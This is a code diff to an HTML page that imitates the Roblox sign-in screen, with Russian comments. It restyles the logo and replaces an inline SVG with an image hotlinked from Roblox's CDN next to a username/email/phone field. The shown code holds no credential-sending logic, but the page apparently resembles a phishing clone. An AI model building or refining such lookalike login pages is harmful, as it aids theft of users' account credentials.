@@ -82,12 +82,13 @@
             z-index: 10;
         }
 
-        /* Исправленный и ровный логотип */
+        /* PNG логотип */
         .roblox-logo-img {
-            width: 170px;
+            width: 160px;
             height: auto;
             margin-bottom: 30px;
             object-fit: contain;
+            filter: brightness(0) invert(1); /* Делает логотип белым */
         }
 
         .input-box {
@@ -217,8 +218,8 @@
     </div>
 
     <div class="container">
-        <!-- Исправленный логотип с правильным наклоном квадрата и отступами -->
-        <img class="roblox-logo-img" src="data:image/svg+xml;utf8,<svg viewBox='0 0 520 90' fill='none' xmlns='http://www.w3.org/2000/svg'><path fill-rule='evenodd' clip-rule='evenodd' d='M31.2 0H8.4C3.76 0 0 3.76 0 8.4V81.6C0 86.24 3.76 90 8.4 90H20.4C25.04 90 28.8 86.24 28.8 81.6V56.4H33.6C44.32 56.4 53.04 47.68 53.04 36.96V19.44C53.04 8.72 44.32 0 33.6 0H31.2ZM34.08 38.88H28.8V17.52H34.08C36.72 17.52 38.88 19.68 38.88 22.32V34.08C38.88 36.72 36.72 38.88 34.08 38.88Z' fill='white'/><g transform='translate(68, 3) rotate(14 40 40)'><rect x='4' y='4' width='72' height='72' rx='14' fill='white'/><rect x='22' y='22' width='36' height='36' rx='6' fill='%230d0f12'/></g><path fill-rule='evenodd' clip-rule='evenodd' d='M178.8 0H153.6C148.96 0 145.2 3.76 145.2 8.4V81.6C145.2 86.24 148.96 90 153.6 90H178.8C194.16 90 206.64 77.52 206.64 62.16V55.68C206.64 47.4 201.36 40.44 194.04 38.04C201.24 35.52 206.4 28.56 206.4 20.4V13.92C206.4 3.72 198.12 0 187.92 0H178.8ZM178.8 34.56H162V17.52H178.8C183.44 17.52 187.2 21.28 187.2 25.92V26.16C187.2 30.8 183.44 34.56 178.8 34.56ZM181.2 72.48H162V55.44H181.2C185.84 55.44 189.6 59.2 189.6 63.84V64.08C189.6 68.72 185.84 72.48 181.2 72.48Z' fill='white'/><path fill-rule='evenodd' clip-rule='evenodd' d='M228 3.6C228 1.61178 229.612 0 231.6 0H248.4C250.388 0 252 1.61178 252 3.6V73.2H283.2C285.188 73.2 286.8 74.8118 286.8 76.8V86.4C286.8 88.3882 285.188 90 283.2 90H231.6C229.612 90 228 88.3882 228 86.4V3.6Z' fill='white'/><path fill-rule='evenodd' clip-rule='evenodd' d='M356.4 0H315.6C302.56 0 302 10.56 302 20.4V69.6C302 79.44 302.56 90 315.6 90H356.4C369.44 90 370 79.44 370 69.6V20.4C370 10.56 369.44 0 356.4 0ZM358.8 69.6C358.8 73.08 355.8 75.6 352.8 75.6H319.2C316.2 75.6 313.2 73.08 313.2 69.6V20.4C313.2 16.92 316.2 14.4 319.2 14.4H352.8C355.8 14.4 358.8 16.92 358.8 20.4V69.6Z' fill='white'/></svg>" alt="Roblox">
+        <!-- PNG Логотип Roblox -->
+        <img class="roblox-logo-img" src="https://images.rbxcdn.com/3d6d548b284e82ac813b573d6d548b28.svg" alt="Roblox">
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Имя пользователя/Электронная почта/Телефон" oninput="checkInputs()">
